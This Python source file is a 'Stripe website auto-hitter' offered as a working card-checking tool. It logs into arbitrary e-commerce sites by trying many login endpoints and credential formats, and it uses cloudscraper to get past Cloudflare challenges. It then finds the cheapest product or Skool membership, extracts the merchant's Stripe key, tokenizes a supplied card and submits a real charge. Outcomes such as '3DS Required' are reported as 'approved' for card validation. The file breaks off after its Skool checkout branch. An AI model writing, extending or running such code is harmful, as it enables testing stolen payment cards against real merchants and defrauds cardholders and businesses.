"""
stripe_web_auto.py — Generic Stripe website auto-hitter
Logs into any Stripe-powered e-commerce site, finds the cheapest
product, adds it to cart, extracts the Stripe PK, tokenizes the
card, and charges it.
"""

import ipaddress
import re
import random
import socket
import time
import requests
from urllib.parse import urljoin, urlparse

USER_AGENT = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/120.0.0.0 Safari/537.36"
)

_DEFAULT_HEADERS = {
    "User-Agent": USER_AGENT,
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.9",
    "Accept-Encoding": "gzip, deflate, br",
}

# Common login form paths
_LOGIN_PATHS = [
    "/login",
    "/account/login",
    "/sign-in",
    "/signin",
    "/user/login",
    "/my-account",
    "/wp-login.php",
    "/auth/login",
    "/auth",
    "/users/sign_in",
    "/session/new",
    "/sessions/new",
    "/member/login",
    "/members/login",
    "/customer/login",
    "/portal/login",
    "/admin/login",
    "/",
]

# Common patterns for Stripe public key
_PK_PATTERNS = [
    r'pk_live_[A-Za-z0-9]{20,}',
    r'pk_test_[A-Za-z0-9]{20,}',
]

# ── SSRF Protection ───────────────────────────────────────────────────────────
_PRIVATE_NETWORKS = [
    ipaddress.ip_network("10.0.0.0/8"),
    ipaddress.ip_network("172.16.0.0/12"),
    ipaddress.ip_network("192.168.0.0/16"),
    ipaddress.ip_network("127.0.0.0/8"),
    ipaddress.ip_network("169.254.0.0/16"),   # link-local
    ipaddress.ip_network("::1/128"),
    ipaddress.ip_network("fc00::/7"),
    ipaddress.ip_network("fe80::/10"),
    ipaddress.ip_network("100.64.0.0/10"),    # shared address space (CGNAT)
    ipaddress.ip_network("0.0.0.0/8"),
]


def _check_host_ssrf(hostname: str) -> None:
    """
    Resolve hostname and raise ValueError if it points to a private/internal
    address.  Called for the initial URL and every redirect hop.
    """
    if not hostname:
        raise ValueError("Invalid URL — no hostname")

    try:
        addr = ipaddress.ip_address(hostname)
        for net in _PRIVATE_NETWORKS:
            if addr in net:
                raise ValueError("Requests to private/internal addresses are not allowed")
        return  # raw IP that is public — OK
    except ValueError as ve:
        if "private" in str(ve) or "internal" in str(ve):
            raise

    # Not a raw IP — resolve hostname
    try:
        resolved_ip = socket.gethostbyname(hostname)
        addr = ipaddress.ip_address(resolved_ip)
        for net in _PRIVATE_NETWORKS:
            if addr in net:
                raise ValueError(f"Hostname resolves to a private/internal IP ({resolved_ip})")
    except ValueError:
        raise
    except Exception:
        pass  # DNS failure — let requests handle it naturally


def _validate_url(url: str) -> str:
    """
    Validate the user-supplied URL against SSRF.
    Returns normalised https:// URL on success.
    Raises ValueError with a user-friendly message on failure.
    """
    if not url.startswith(("http://", "https://")):
        url = "https://" + url

    parsed = urlparse(url)
    if parsed.scheme not in ("http", "https"):
        raise ValueError("Only http/https URLs are allowed")

    _check_host_ssrf(parsed.hostname or "")
    return url.rstrip("/")


def _ssrf_redirect_hook(response, **kwargs):
    """
    Response hook installed on every _make_session() session.
    Fires for every HTTP response in the redirect chain.
    If the response is a redirect, validates the Location target before
    requests follows it, blocking redirects to private/internal hosts.
    """
    if response.is_redirect:
        location = response.headers.get("Location", "")
        if location:
            try:
                # Resolve relative redirects against the current URL
                abs_loc = urljoin(response.url, location)
                parsed = urlparse(abs_loc)
                if parsed.scheme not in ("http", "https"):
                    raise ValueError(f"Redirect to non-http(s) scheme blocked: {parsed.scheme}")
                _check_host_ssrf(parsed.hostname or "")
            except ValueError as ve:
                # Raise so requests propagates it as an exception rather than
                # silently following the redirect to an internal target.
                raise requests.exceptions.InvalidURL(str(ve))


def _make_session() -> requests.Session:
    """
    Create a scraper session that transparently bypasses Cloudflare IUAM /
    browser-challenge pages (cloudscraper solves the JS challenge), while
    still applying SSRF redirect protection via our response hook.
    Falls back to a plain requests.Session if cloudscraper is unavailable.
    """
    try:
        import cloudscraper
        s = cloudscraper.create_scraper(
            browser={"browser": "chrome", "platform": "windows", "desktop": True},
            delay=5,
        )
    except Exception:
        s = requests.Session()

    s.headers.update(_DEFAULT_HEADERS)
    s.hooks["response"].append(_ssrf_redirect_hook)
    return s


def _extract_stripe_pk(html_text: str) -> str | None:
    for pat in _PK_PATTERNS:
        m = re.search(pat, html_text)
        if m:
            return m.group(0)
    return None


def _extract_stripe_pk_from_site(session: requests.Session, site_url: str) -> str | None:
    """Fetch the site's HTML and extract a Stripe publishable key."""
    try:
        r = session.get(site_url, timeout=12)
        pk = _extract_stripe_pk(r.text)
        if pk:
            return pk
        # Also check JS bundles referenced from the page
        for src in re.findall(r'<script[^>]+src=["\']([^"\']+\.js(?:\?[^"\']*)?)["\']', r.text)[:5]:
            if not src.startswith("http"):
                src = site_url.rstrip("/") + "/" + src.lstrip("/")
            try:
                rjs = session.get(src, timeout=8)
                pk = _extract_stripe_pk(rjs.text)
                if pk:
                    return pk
            except Exception:
                pass
    except Exception:
        pass
    return None


_CAPTCHA_MARKERS = [
    "g-recaptcha",
    "recaptcha",
    "hcaptcha",
    "h-captcha",
    "data-sitekey",
    "captcha",
]

def _detect_bot_protection(response: requests.Response) -> str | None:
    """
    Inspect a response for signs of bot-protection or rate-limiting.
    Returns a user-facing error string if detected, or None if clean.

    Rules:
    - cf-ray header alone is NOT a block signal (present on all CF-proxied sites).
    - 'challenge-platform' in the body is NOT a block signal (appears in Turnstile
      JS URLs on functional pages).
    - We only block on definitive signals: HTTP 429, or specific body text that
      ONLY appears on a real CF block/ban page.
    """
    status = response.status_code

    if status == 429:
        return "Site is rate-limiting requests — try again later"

    body = response.text.lower()

    # These strings appear exclusively on real Cloudflare block/challenge pages,
    # NOT on functional pages that simply use CF as a CDN or Turnstile as a widget.
    _DEFINITIVE_BLOCK = [
        "just a moment...",
        "enable javascript and cookies to continue",
        "you have been blocked",
        "your ip address is banned",
        "access denied | cloudflare",
        "ddos-guard",
    ]
    if any(m in body for m in _DEFINITIVE_BLOCK):
        return "Site is blocking automated access — cannot auto-hit"

    # 503 without a real page suggests a bot-wall or maintenance
    if status == 503 and len(response.text) < 5000:
        return "Site is temporarily unavailable (503)"

    return None


def _detect_captcha(html: str) -> bool:
    """Return True if the page contains a CAPTCHA challenge."""
    lower = html.lower()
    return any(marker in lower for marker in _CAPTCHA_MARKERS)


def _find_login_url(
    session: requests.Session, site_url: str
) -> tuple[str | None, str | None, str | None]:
    """
    Return (login_url, page_html, error) for the first working login path.
    On success: (url, html, None).
    On bot/rate-limit/captcha detection (after all paths exhausted): (None, None, error_message).
    When no login page is found at all: (None, None, None).

    Protection errors are tracked across all paths but do not cause an early exit —
    a later path may succeed even if an earlier one was blocked.
    """
    last_protection_error: str | None = None
    pages_tried = 0

    for path in _LOGIN_PATHS:
        try:
            url = site_url + path
            r = session.get(url, timeout=15, allow_redirects=True)

            # Only skip on definitive bot-blocks (429, known block pages).
            # Do NOT skip merely because CF headers are present — CF is on millions
            # of functional sites and cloudscraper already handles the JS challenge.
            protection_error = _detect_bot_protection(r)
            if protection_error:
                last_protection_error = protection_error
                continue

            pages_tried += 1
            if r.status_code == 200 and any(
                kw in r.text.lower()
                for kw in ["password", "email", "log in", "login", "sign in", "sign_in"]
            ):
                if _detect_captcha(r.text):
                    return None, None, "Login requires CAPTCHA — cannot auto-hit this site"
                # Must have an actual password input — not just a SPA page whose title
                # mentions "login" but renders the form in JavaScript at runtime.
                has_password_input = bool(re.search(
                    r'<input[^>]+type=["\']password["\']', r.text, re.IGNORECASE
                ))
                if not has_password_input:
                    continue
                return r.url, r.text, None
        except Exception:
            continue

    # Surface the most useful error message
    if last_protection_error:
        return None, None, last_protection_error
    if pages_tried > 0:
        return None, None, (
            "No login form found — site uses JavaScript-rendered authentication "
            "(React/Vue SPA). /wah only works on sites with an HTML login form."
        )
    return None, None, "Login page not found on this site"


def _extract_form_fields(html_text: str, form_action_hint: str = "") -> dict:
    """Extract hidden form fields (CSRF tokens, etc.) from HTML."""
    fields = {}
    for m in re.finditer(
        r'<input[^>]+type=["\']hidden["\'][^>]*name=["\']([^"\']+)["\'][^>]*value=["\']([^"\']*)["\']',
        html_text,
        re.IGNORECASE,
    ):
        fields[m.group(1)] = m.group(2)
    for m in re.finditer(
        r'<input[^>]+name=["\']([^"\']+)["\'][^>]*type=["\']hidden["\'][^>]*value=["\']([^"\']*)["\']',
        html_text,
        re.IGNORECASE,
    ):
        fields[m.group(1)] = m.group(2)
    for m in re.finditer(
        r'<meta[^>]+name=["\']csrf-token["\'][^>]*content=["\']([^"\']+)["\']',
        html_text,
        re.IGNORECASE,
    ):
        fields["_token"] = m.group(1)
        fields["csrf_token"] = m.group(1)
    return fields


def _api_login(session: requests.Session, site_url: str, email: str, password: str) -> dict:
    """
    API-based login for JavaScript SPAs (React/Vue/Angular) that have no HTML
    login form.  Strategy:
      1. Download the app's JS bundles and scan for auth API endpoint paths.
      2. Combine discovered endpoints with a large static list of common patterns.
      3. Try each endpoint with several payload formats (JSON/form, field name variants).
      4. Detect success via JWT token, auth cookie, or positive response body.
      5. Inject discovered auth token into the session for subsequent requests.
    """
    # ── Step 1: Fetch root page and extract extra API base URLs ─────────────
    discovered_endpoints: list[str] = []
    extra_api_bases: list[str] = []   # other domains found in page config

    # Fetch root page + login page (login page often has more embedded config)
    pages_html: list[str] = []
    for fetch_url in [site_url, site_url + "/login", site_url + "/signin"]:
        try:
            r_root = session.get(fetch_url, timeout=12, allow_redirects=True)
            if r_root.status_code == 200:
                pages_html.append(r_root.text)
        except Exception:
            pass
    root_html = pages_html[0] if pages_html else ""
    combined_html = "\n".join(pages_html)

    import json as _json

    def _extract_api_bases_from_html(html: str) -> None:
        """Pull API base URLs from SSR config embedded in the page."""
        # 1. Next.js __NEXT_DATA__ — walks the full JSON tree
        nd_m = re.search(
            r'<script[^>]+id=["\']__NEXT_DATA__["\'][^>]*>(.*?)</script>',
            html, re.DOTALL | re.IGNORECASE,
        )
        if nd_m:
            try:
                nd = _json.loads(nd_m.group(1))
                # Also scan raw JSON for API_URL keys (faster + catches all nesting)
                for raw_m in re.finditer(
                    r'"([A-Z_]*(?:API|BASE)[A-Z_]*URL[A-Z_]*)"\s*:\s*"(https?://[^"]{3,80})"',
                    nd_m.group(1), re.IGNORECASE,
                ):
                    extra_api_bases.append(raw_m.group(2).rstrip('/'))
            except Exception:
                pass

        # 2. Vite / CRA / React env-var patterns injected into the bundle or page
        for env_m in re.finditer(
            r'(?:API_URL|VITE_API|apiUrl|baseUrl|REACT_APP_API|API_BASE)[^"\'`]{0,20}["\`\'](https?://[^"\'`\s]{5,80})["\`\']',
            html, re.IGNORECASE,
        ):
            extra_api_bases.append(env_m.group(1).rstrip('/'))

        # 3. Bare JSON assignment patterns: "API_URL":"https://..."
        for bare_m in re.finditer(
            r'"(?:API_URL|apiUrl|baseUrl|api_url|API_BASE_URL)"\s*:\s*"(https?://[^"]{3,80})"',
            html, re.IGNORECASE,
        ):
            extra_api_bases.append(bare_m.group(1).rstrip('/'))

    for page_html in pages_html:
        _extract_api_bases_from_html(page_html)

    js_bundle_text = root_html
    # Download main JS bundles (React/Vue typically emit app.*.js, main.*.js, etc.)
    _BUNDLE_PATTERNS = re.compile(
        r'src=["\']([^"\']*(?:app|main|bundle|vendor|chunk|index)[^"\']*\.js[^"\']*)["\']',
        re.IGNORECASE,
    )
    for js_src in _BUNDLE_PATTERNS.findall(root_html)[:6]:  # cap at 6 files
        try:
            rj = session.get(urljoin(site_url, js_src), timeout=12)
            if rj.status_code == 200:
                js_bundle_text += rj.text[:500_000]  # cap per-file at 500 KB
        except Exception:
            pass

    # Extract paths that look like auth API endpoints from bundle source
    _AUTH_PATH_RE = re.compile(
        r'["\`](/(?:api/)?(?:v\d+/)?(?:auth|login|sign[-_]in|session|token|user|account)'
        r'(?:/[a-z_\-]{1,30}){0,3})["\`]',
        re.IGNORECASE,
    )
    # Build against site_url AND any extra API bases found above
    api_bases_to_try = [site_url] + [b for b in dict.fromkeys(extra_api_bases) if b != site_url]

    for m in _AUTH_PATH_RE.finditer(js_bundle_text):
        path = m.group(1)
        for base in api_bases_to_try:
            full = base + path
            if full not in discovered_endpoints:
                discovered_endpoints.append(full)

    # ── Step 2: Static fallback endpoint list ────────────────────────────────
    _STATIC_AUTH = [
        f"{site_url}/api/auth/login",
        f"{site_url}/api/auth/signin",
        f"{site_url}/api/auth/sign-in",
        f"{site_url}/api/login",
        f"{site_url}/api/sign-in",
        f"{site_url}/api/signin",
        f"{site_url}/api/v1/auth/login",
        f"{site_url}/api/v1/login",
        f"{site_url}/api/v1/sessions",
        f"{site_url}/api/v2/auth/login",
        f"{site_url}/api/users/sign_in",
        f"{site_url}/api/user/login",
        f"{site_url}/api/session",
        f"{site_url}/api/sessions",
        f"{site_url}/api/token",
        f"{site_url}/api/tokens",
        f"{site_url}/api/accounts/login",
        f"{site_url}/auth/login",
        f"{site_url}/auth/signin",
        f"{site_url}/auth/token",
        f"{site_url}/auth/local",
        f"{site_url}/users/sign_in",
        f"{site_url}/user/login",
        f"{site_url}/login",
        f"{site_url}/signin",
        f"{site_url}/session",
        f"{site_url}/oauth/token",
        f"{site_url}/connect/token",
        f"{site_url}/identity/connect/token",
        # WordPress/WooCommerce REST
        f"{site_url}/wp-json/wp/v2/users/me",
        f"{site_url}/wp-json/jwt-auth/v1/token",
        f"{site_url}/wp-json/simple-jwt-login/v1/auth",
        # Membership platforms
        f"{site_url}/api/membership/login",
        f"{site_url}/api/members/login",
        f"{site_url}/members/auth",
    ]
    # Discovered endpoints go first (higher confidence)
    all_endpoints = discovered_endpoints + [e for e in _STATIC_AUTH if e not in discovered_endpoints]

    # ── Step 3: Payload variants to try for each endpoint ────────────────────
    def _make_auth_payloads(email: str, pwd: str) -> list[tuple[dict, str]]:
        """Return (payload, format) pairs. format is 'json' or 'form'."""
        return [
            ({"email": email, "password": pwd}, "json"),
            ({"username": email, "password": pwd}, "json"),
            ({"login": email, "password": pwd}, "json"),
            ({"user": {"email": email, "password": pwd}}, "json"),
            ({"credentials": {"email": email, "password": pwd}}, "json"),
            # OAuth2 password grant
            ({"grant_type": "password", "username": email, "password": pwd,
              "scope": "openid profile email"}, "json"),
            # Form-encoded variants
            ({"email": email, "password": pwd}, "form"),
            ({"username": email, "password": pwd, "log": email, "pwd": pwd}, "form"),
        ]

    payloads = _make_auth_payloads(email, password)

    # ── Step 4: Success / failure detection ──────────────────────────────────
    _SUCCESS_KEYS = re.compile(
        r'\b(?:token|access_token|id_token|jwt|auth_token|session_token|'
        r'accessToken|idToken|authToken|sessionToken)\b',
        re.IGNORECASE,
    )
    _BAD_CREDS = re.compile(
        r'invalid.{0,20}(?:email|password|credential|user)|'
        r'incorrect.{0,20}(?:email|password)|'
        r'wrong.{0,20}password|'
        r'no.{0,10}account|'
        r'user.{0,10}not.{0,10}found|'
        r'authentication.{0,10}failed',
        re.IGNORECASE,
    )
    _AUTH_HEADER_KW = ("bearer", "token", "jwt")

    tried: set[str] = set()
    for ep_url in all_endpoints:
        if ep_url in tried:
            continue
        tried.add(ep_url)
        for pay_data, pay_fmt in payloads:
            try:
                if pay_fmt == "json":
                    r_auth = session.post(
                        ep_url, json=pay_data, timeout=15,
                        headers={
                            "Accept": "application/json",
                            "Content-Type": "application/json",
                            "X-Requested-With": "XMLHttpRequest",
                            "Origin": site_url,
                            "Referer": site_url + "/login",
                        },
                    )
                else:
                    r_auth = session.post(
                        ep_url, data=pay_data, timeout=15,
                        headers={"Origin": site_url, "Referer": site_url + "/login"},
                        allow_redirects=True,
                    )

                # Non-existent endpoint
                if r_auth.status_code in (404, 405, 410):
                    break  # skip remaining payload variants for this URL

                # Explicit bad-credentials response
                try:
                    resp_body = str(r_auth.json())
                except Exception:
                    resp_body = r_auth.text or ""

                if _BAD_CREDS.search(resp_body):
                    return {"ok": False, "error": "Invalid credentials (wrong email/password)"}

                # Success: look for a token in the response body
                if r_auth.status_code in (200, 201) and _SUCCESS_KEYS.search(resp_body):
                    # Extract and inject the token into the session
                    tok_m = re.search(
                        r'(?:token|access_token|id_token|jwt|auth_token|accessToken|idToken)'
                        r'["\s:]+([A-Za-z0-9\-_.]{20,500})',
                        resp_body, re.IGNORECASE,
                    )
                    if tok_m:
                        token_val = tok_m.group(1).strip('"\'')
                        session.headers.update({"Authorization": f"Bearer {token_val}"})
                    return {"ok": True, "method": "api", "endpoint": ep_url}

                # Success: auth cookie set without an explicit token body
                if r_auth.status_code in (200, 201) and r_auth.cookies:
                    cookie_names = [c.name.lower() for c in r_auth.cookies]
                    if any(k in n for n in cookie_names
                           for k in ("session", "auth", "token", "jwt", "user", "login")):
                        return {"ok": True, "method": "api_cookie", "endpoint": ep_url}

                # Success: was redirected to a dashboard / account area
                if r_auth.status_code in (200, 201):
                    final = r_auth.url.lower()
                    if any(kw in final for kw in ("/dashboard", "/account", "/profile",
                                                   "/home", "/app", "/portal", "/member")):
                        return {"ok": True, "method": "api_redirect", "endpoint": ep_url}

            except Exception:
                continue

    return {"ok": False, "error": f"No working login API found (tried {len(tried)} endpoints)"}


def login_to_site(
    session: requests.Session, site_url: str, email: str, password: str
) -> dict:
    """
    Attempt login via:
      1. HTML form-based login (traditional sites, WordPress, WooCommerce, etc.)
      2. API / JSON login fallback (React/Vue SPAs, modern SaaS, membership platforms)
    Returns {"ok": True} on success, {"ok": False, "error": "..."} on failure.
    """
    # ── Path 1: HTML form login ───────────────────────────────────────────────
    login_url, login_html, find_error = _find_login_url(session, site_url)
    if login_url:
        hidden = _extract_form_fields(login_html)
        payload = {**hidden, "email": email, "password": password}
        payload.setdefault("username", email)
        payload.setdefault("log", email)
        payload.setdefault("pwd", password)
        payload.setdefault("rememberme", "forever")
        payload.setdefault("redirect", "")

        form_action = None
        m = re.search(r'<form[^>]+action=["\']([^"\']+)["\']', login_html, re.IGNORECASE)
        if m:
            form_action = urljoin(login_url, m.group(1))
        post_url = form_action or login_url

        try:
            r = session.post(
                post_url, data=payload, timeout=20, allow_redirects=True,
                headers={"Referer": login_url, "Content-Type": "application/x-www-form-urlencoded"},
            )
            body_lower = r.text.lower()
            if any(kw in body_lower for kw in ["incorrect password", "invalid credentials",
                                                "wrong password", "no account found",
                                                "does not exist", "invalid email"]):
                return {"ok": False, "error": "Invalid credentials"}
            return {"ok": True, "method": "form"}
        except requests.Timeout:
            return {"ok": False, "error": "Login timeout"}
        except Exception as e:
            return {"ok": False, "error": str(e)[:60]}

    # If there was a definitive block (rate-limit / ban), stop here
    if find_error and "blocking" in (find_error or "").lower():
        return {"ok": False, "error": find_error}
    if find_error and "captcha" in (find_error or "").lower():
        return {"ok": False, "error": find_error}

    # ── Path 2: API / JSON login (SPA sites) ─────────────────────────────────
    api_result = _api_login(session, site_url, email, password)
    if api_result.get("ok"):
        return api_result

    # Report the most useful error
    html_err = find_error or "No HTML login form found"
    api_err  = api_result.get("error", "API login failed")
    return {
        "ok": False,
        "error": f"Form login: {html_err} | API login: {api_err}",
    }


def _skool_group_product(session: requests.Session, site_url: str) -> dict | None:
    """
    If site_url is a Skool community URL (skool.com/<slug>), fetch the group data
    from api2.skool.com and return a product dict suitable for checkout_and_charge.
    Returns None if the URL is not a Skool group page or no paid membership is set.
    """
    from urllib.parse import urlparse
    import json as _json

    parsed = urlparse(site_url)
    if "skool.com" not in parsed.netloc:
        return None

    # The group slug is the first path segment: /group-slug[/...] or just /
    path_parts = [p for p in parsed.path.strip("/").split("/") if p]
    if not path_parts:
        return None  # bare skool.com — no specific group
    slug = path_parts[0]
    if slug in ("pricing", "login", "signup", "signin", "discover", "about"):
        return None  # not a group page

    # Fetch group data from Skool's backend API
    try:
        r_group = session.get(
            f"https://api2.skool.com/groups/{slug}",
            timeout=12,
            headers={"Accept": "application/json", "Origin": "https://www.skool.com"},
        )
        if r_group.status_code != 200:
            return None
        g = r_group.json()
    except Exception:
        return None

    meta = g.get("metadata", {})
    group_id = g.get("id", "")
    display_name = meta.get("display_name", slug)

    # Look for paid membership billing product ID (metadata.mmbp) and price.
    # NOTE: metadata.membership is a type enum (0=free,1=public,2=paid…), NOT a price.
    billing_product_id = meta.get("mmbp") or meta.get("billing_product_id")
    raw_price = meta.get("price") or meta.get("amount")  # only dedicated price fields

    try:
        price = float(str(raw_price)) if raw_price else 0.0
    except (TypeError, ValueError):
        price = 0.0

    # A paid group must have at least a billing_product_id; otherwise skip
    if not billing_product_id:
        return None

    # Get Stripe billing PK from the group's page __NEXT_DATA__
    billing_pk = None
    try:
        rp = session.get(site_url, timeout=12, allow_redirects=True)
        nd_m = re.search(
            r'<script[^>]+id=["\']__NEXT_DATA__["\'][^>]*>(.*?)</script>',
            rp.text, re.DOTALL | re.IGNORECASE,
        )
        if nd_m:
            raw = nd_m.group(1)
            for key in ("BILLING_STRIPE_PUBLISHABLE_KEY", "STRIPE_PUBLISHABLE_KEY"):
                m2 = re.search(rf'"{key}"\s*:\s*"(pk_[a-zA-Z0-9_]+)"', raw)
                if m2:
                    billing_pk = m2.group(1)
                    break
    except Exception:
        pass

    interval = meta.get("recurring_interval", "month")
    return {
        "title": f"{display_name} Membership (${price:.2f}/{interval})" if price > 0
                 else f"{display_name} Membership",
        "price": price,
        "product_url": site_url,
        "variant_id": None,
        "source": "skool_group",
        "billing_product_id": billing_product_id,
        "group_id": group_id,
        "group_slug": slug,
        "billing_pk_override": billing_pk,
        "api_base": "https://api2.skool.com",
    }


def find_cheapest_product(session: requests.Session, site_url: str) -> dict | None:
    """
    Scrape the site for products and return info about the cheapest available one.
    Returns dict with keys: title, price, product_url, variant_id (if any)
    or None if nothing found.
    When bot-protection is detected, returns {"error": "<message>"} instead.
    """
    last_protection_error: str | None = None

    # 0. Skool community group detection — must run before generic scraping
    skool_product = _skool_group_product(session, site_url)
    if skool_product is not None:
        return skool_product

    # 1. Try Shopify /products.json endpoint first
    for path in ["/products.json", "/collections/all/products.json"]:
        try:
            r = session.get(site_url + path, timeout=15)

            protection_error = _detect_bot_protection(r)
            if protection_error:
                last_protection_error = protection_error
                continue

            if _detect_captcha(r.text):
                return {"error": "Site requires CAPTCHA on product pages — cannot auto-hit"}

            if r.status_code == 200:
                data = r.json()
                products = data.get("products", [])
                cheapest = None
                cheapest_price = float("inf")
                for product in products:
                    for variant in product.get("variants", []):
                        if not variant.get("available", True):
                            continue
                        try:
                            price = float(variant.get("price", 0))
                        except (TypeError, ValueError):
                            continue
                        if 0 < price < cheapest_price:
                            cheapest_price = price
                            handle = product.get("handle", "")
                            cheapest = {
                                "title": product.get("title", "Unknown"),
                                "price": price,
                                "product_url": f"{site_url}/products/{handle}",
                                "variant_id": variant.get("id"),
                                "source": "shopify_json",
                            }
                if cheapest:
                    return cheapest
        except Exception:
            pass

    # 2. Scrape generic product listing pages
    for path in ["/shop", "/products", "/store", "/collections/all", "/"]:
        try:
            r = session.get(site_url + path, timeout=15)

            protection_error = _detect_bot_protection(r)
            if protection_error:
                last_protection_error = protection_error
                continue

            if _detect_captcha(r.text):
                return {"error": "Site requires CAPTCHA on product pages — cannot auto-hit"}

            if r.status_code != 200:
                continue
            html = r.text
            price_pattern = re.compile(
                r'(?:href=["\'])(/[^"\']+)["\'][^<]*?(?:<[^>]+>)*?[^<]*?'
                r'[\$£€]\s*([\d,]+\.?\d*)',
                re.IGNORECASE | re.DOTALL,
            )
            cheapest = None
            cheapest_price = float("inf")
            for m in price_pattern.finditer(html):
                link = m.group(1)
                price_str = m.group(2).replace(",", "")
                try:
                    price = float(price_str)
                except ValueError:
                    continue
                if 0 < price < cheapest_price:
                    cheapest_price = price
                    cheapest = {
                        "title": link.split("/")[-1].replace("-", " ").title(),
                        "price": price,
                        "product_url": site_url + link,
                        "variant_id": None,
                        "source": "html_scrape",
                    }
            if cheapest:
                return cheapest
        except Exception:
            continue

    # 3. Try subscription / membership / pricing pages
    _SUB_PATHS = [
        "/pricing",
        "/plans",
        "/plan",
        "/membership",
        "/memberships",
        "/join",
        "/subscribe",
        "/subscriptions",
        "/upgrade",
        "/enroll",
        "/checkout",
        "/register",
    ]
    # Price + optional billing-period label anywhere on the page
    _sub_price_re = re.compile(
        r'[\$£€]\s*([\d,]+\.?\d*)\s*(?:/\s*(?:mo(?:nth)?|yr|year|week|wk|day|annual))?',
        re.IGNORECASE,
    )
    # Optionally paired with a nearby href for the plan CTA
    _sub_link_re = re.compile(
        r'href=["\']([^"\']+)["\'][^<]{0,200}?[\$£€]\s*[\d,]+\.?\d*'
        r'|[\$£€]\s*[\d,]+\.?\d*[^<]{0,200}?href=["\']([^"\']+)["\']',
        re.IGNORECASE | re.DOTALL,
    )

    for path in _SUB_PATHS:
        try:
            r = session.get(site_url + path, timeout=15)

            protection_error = _detect_bot_protection(r)
            if protection_error:
                last_protection_error = protection_error
                continue

            if _detect_captcha(r.text):
                return {"error": "Site requires CAPTCHA on subscription page — cannot auto-hit"}

            if r.status_code != 200:
                continue

            html = r.text
            # Collect all prices found on this page
            prices_found = []
            for m in _sub_price_re.finditer(html):
                try:
                    price = float(m.group(1).replace(",", ""))
                except ValueError:
                    continue
                if price > 0:
                    prices_found.append(price)

            if not prices_found:
                continue

            cheapest_price = min(prices_found)

            # Try to find a plan link near the cheapest price text
            plan_url = site_url + path  # default: the pricing page itself
            for lm in _sub_link_re.finditer(html):
                href = lm.group(1) or lm.group(2) or ""
                if href and not href.startswith("http"):
                    href = site_url + href
                if href:
                    plan_url = href
                    break

            return {
                "title": f"Subscription Plan (${cheapest_price:.2f})",
                "price": cheapest_price,
                "product_url": plan_url,
                "variant_id": None,
                "source": "subscription_scrape",
                "pricing_page": site_url + path,
            }
        except Exception:
            continue

    if last_protection_error:
        return {"error": last_protection_error}

    return None


def checkout_and_charge(
    session: requests.Session,
    site_url: str,
    product_info: dict,
    card: dict,
) -> dict:
    """
    Add product to cart, navigate to checkout, extract Stripe PK,
    tokenize the card and submit.  Returns a result dict with keys:
      status  — "approved" | "declined" | "error"
      message — human-readable result string
      stripe_pk — the PK found (if any)

    Only returns "approved" when a confirmed positive signal is received
    (3DS required, succeeded, insufficient funds, CVV mismatch, etc.).
    Returns "error" when the merchant response is ambiguous or absent.
    """
    product_url = product_info.get("product_url", "")
    variant_id  = product_info.get("variant_id")
    source      = product_info.get("source", "")

    # ── Skool community group checkout ────────────────────────────────────────
    # Uses Skool's own backend API: /billing/transactions
    # Requires billing_product_id (from group metadata.mmbp).
    if source == "skool_group":
        billing_product_id = product_info.get("billing_product_id")
        api_base = product_info.get("api_base", "https://api2.skool.com")

        if not billing_product_id:
            return {
                "status": "error",
                "message": (
                    "Skool group found but billing_product_id not set — "
                    "this group may be free or not yet configured for paid membership"
                ),
                "stripe_pk": None,
            }

        # Use Skool's billing Stripe PK (may differ from main Stripe PK)
        stripe_pk = (product_info.get("billing_pk_override")
                     or _extract_stripe_pk_from_site(session, site_url))
        if not stripe_pk:
            return {"status": "error", "message": "Skool Stripe PK not found", "stripe_pk": None}

        import uuid as _uuid
        cc = card["cc"]; mm = card["mm"]; yy = card["yy"]; cvv = card["cvv"]

        # Create Stripe payment method
        try:
            pm_resp = requests.post(
                "https://api.stripe.com/v1/payment_methods",
                data={
                    "type": "card",
                    "card[number]": cc, "card[cvc]": cvv,
                    "card[exp_month]": mm, "card[exp_year]": yy,
                    "key": stripe_pk,
                },
                headers={
                    "authority": "api.stripe.com", "accept": "application/json",
                    "content-type": "application/x-www-form-urlencoded",
                    "origin": "https://js.stripe.com", "referer": "https://js.stripe.com/",
                    "user-agent": USER_AGENT,
                },
                timeout=20,
            ).json()
        except Exception as e:
            return {"status": "error", "message": f"Stripe API error: {e}", "stripe_pk": stripe_pk}

        if "error" in pm_resp:
            err = pm_resp["error"]
            code = err.get("code", "")
            msg = err.get("message", "Card Declined")
            _decline_map = {
                "incorrect_number": "Incorrect Card Number",
                "invalid_number": "Invalid Card Number",
                "invalid_expiry_year": "Invalid Expiry Year",
                "invalid_expiry_month": "Invalid Expiry Month",
                "invalid_cvc": "Invalid CVC",
                "expired_card": "Expired Card",
            }
            return {"status": "declined",
                    "message": f"Declined - {_decline_map.get(code, msg)}",
                    "stripe_pk": stripe_pk}

        pm_id = pm_resp.get("id")
        if not pm_id:
            return {"status": "error", "message": "No payment method ID from Stripe", "stripe_pk": stripe_pk}

        # POST to Skool's billing/transactions endpoint
        idem_key = str(_uuid.uuid4())  # UUID idempotency key, matches frontend
        try:
            r_txn = session.post(
                f"{api_base}/billing/transactions",
                json={
                    "payment_method_id": pm_id,
                    "billing_product_id": billing_product_id,
                    "idem_key": idem_key,
                    "version": 2,
                },
                headers={
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "Origin": "https://www.skool.com",
                    "Referer": site_url,
                },
                timeout=20,
            )
        except Exception as e:
            return {"status": "error", "message": f"Skool checkout error: {e}", "stripe_pk": stripe_pk}

        try:
            txn_data = r_txn.json()
        except Exception:
            txn_data = {}

        txn_text = str(txn_data)
        # Check for 3DS / requires_action
        if r_txn.status_code == 200 or r_txn.status_code == 201:
            client_secret = txn_data.get("data", {}).get("clientSecret") or txn_data.get("clientSecret")
            if client_secret or "requires_action" in txn_text or "3ds" in txn_text.lower():
                return {"status": "approved", "message": "3DS Required", "stripe_pk": stripe_pk}
            if txn_data.get("data") or txn_data.get("token") or "success" in txn_text.lower():
                return {"status": "approved", "message": "Approved - Subscription charged", "stripe_pk": stripe_pk}
        if r_txn.status_code in (400, 402, 422):
            err_msg = txn_data.get("error", txn_data.get("message", txn_text[:80]))
            return {"status": "declined", "message": f"Declined - {err_msg}", "stripe_pk": stripe_pk}

        return {
            "status": "error",
            "message": f"Skool checkout returned HTTP {r_txn.status_code}: {txn_text[:80]}",
            "stripe_pk": stripe_pk,
        }

